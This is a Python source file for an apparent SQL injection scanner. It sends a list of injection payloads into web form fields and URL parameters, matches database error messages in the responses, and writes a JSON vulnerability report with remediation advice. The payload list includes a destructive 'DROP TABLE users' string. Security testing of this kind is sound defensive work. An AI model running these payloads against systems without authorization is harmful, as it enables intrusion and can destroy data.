import json
import requests
from urllib.parse import urlparse, urlunparse, urlencode
import re
import logging
import time

class SQLiTester:
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "'; DROP TABLE users; --",
        "\" OR \"1\"=\"1",
        "\" OR 1=1--",
        "\" OR 1=1#",
        "\" OR 1=1/*",
        "' OR 'x'='x",
        "' OR 1=1-- -",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 'a'='a",
        "' OR 'a'='a' -- ",
        "' OR 'a'='a' #",
        "' OR 'a'='a' /*",
    ]

    SQL_ERROR_PATTERNS = [
        re.compile(r"you have an error in your sql syntax", re.I),
        re.compile(r"warning: mysql", re.I),
        re.compile(r"unclosed quotation mark after the character string", re.I),
        re.compile(r"quoted string not properly terminated", re.I),
        re.compile(r"pg_query\(\) \[:", re.I),
        re.compile(r"mysql_fetch_array\(\)", re.I),
        re.compile(r"syntax error", re.I),
        re.compile(r"sqlstate", re.I),
        re.compile(r"mysql_num_rows\(\)", re.I),
        re.compile(r"mysql_query\(\)", re.I),
        re.compile(r"mysql_result\(\)", re.I),
        re.compile(r"odbc_exec\(\)", re.I),
        re.compile(r"sql syntax.*?mysql", re.I),
        re.compile(r"syntax error.*?oracle", re.I),
        re.compile(r"sql error", re.I),
        re.compile(r"db2 sql error", re.I),
        re.compile(r"unexpected end of sql command", re.I),
        re.compile(r"microsoft sql server", re.I),
        re.compile(r"native client", re.I),
        re.compile(r"sql server driver", re.I),
        re.compile(r"oledb", re.I),
        re.compile(r"syntax error in string in query expression", re.I),
    ]

    def __init__(self, session=None, delay=1):
        self.delay = delay
        self.session = session or requests.Session()
        self.vulnerabilities = []
        logging.basicConfig(filename='sqlitester.log', level=logging.INFO,
                            format='%(asctime)s - %(levelname)s - %(message)s')

    def run_tests(self, metadata):
        for page in metadata:
            url = page.get('url')
            forms = page.get('forms', [])
            query_params = page.get('query_params', {})

            # Test forms
            for form in forms:
                self.test_form(url, form)

            # Test URL parameters
            if query_params:
                self.test_url_params(url, query_params)

    def test_form(self, url, form):
        action = form.get('action') or url
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', [])

        for payload in self.SQLI_PAYLOADS:
            data = {}
            for inp in inputs:
                name = inp.get('name')
                if not name:
                    continue
                data[name] = payload

            try:
                logging.info(f"Testing form at {action} with payload: {payload}")
                if method == 'POST':
                    response = self.session.post(action, data=data, timeout=10)
                else:
                    response = self.session.get(action, params=data, timeout=10)

                self.analyze_response(url, 'form', action, data, response)

                time.sleep(self.delay)
            except requests.RequestException as e:
                logging.error(f"Request error testing form at {action}: {e}")

    def test_url_params(self, url, query_params):
        parsed_url = urlparse(url)
        base_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, '', '', ''))

        for payload in self.SQLI_PAYLOADS:
            for param in query_params.keys():
                new_params = query_params.copy()
                new_params[param] = [payload]

                encoded_params = urlencode(new_params, doseq=True)
                test_url = f"{base_url}?{encoded_params}"

                try:
                    logging.info(f"Testing URL {test_url} with payload in param {param}")
                    response = self.session.get(test_url, timeout=10)
                    self.analyze_response(url, 'url_param', param, {param: payload}, response)
                    time.sleep(self.delay)
                except requests.RequestException as e:
                    logging.error(f"Request error testing URL param at {test_url}: {e}")

    def analyze_response(self, original_url, test_type, target, payload, response):
        content = response.text.lower()
        for pattern in self.SQL_ERROR_PATTERNS:
            if pattern.search(content):
                vuln = {
                    'url': original_url,
                    'test_type': test_type,
                    'target': target,
                    'payload': payload,
                    'http_status': response.status_code,
                    'error_message': pattern.pattern,
                    'response_snippet': self.get_snippet(content, pattern)
                }
                self.vulnerabilities.append(vuln)
                logging.warning(f"Vulnerability found: {vuln}")
                break

    def get_snippet(self, content, pattern, snippet_length=200):
        match = pattern.search(content)
        if not match:
            return ''
        start = max(match.start() - snippet_length // 2, 0)
        end = min(match.end() + snippet_length // 2, len(content))
        return content[start:end]

    def generate_report(self):
        total_vulns = len(self.vulnerabilities)
        report = {
            'total_vulnerabilities': total_vulns,
            'vulnerabilities': self.vulnerabilities,
            'recommendations': [
                "Use parameterized queries or prepared statements.",
                "Implement proper input validation and sanitization.",
                "Use stored procedures where applicable.",
                "Implement proper error handling to avoid exposing database errors.",
                "Limit database user permissions to minimize impact."
            ]
        }
        report_file = 'sqli_report.json'
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=4)
        logging.info(f"SQL Injection testing completed. Report saved to {report_file}")
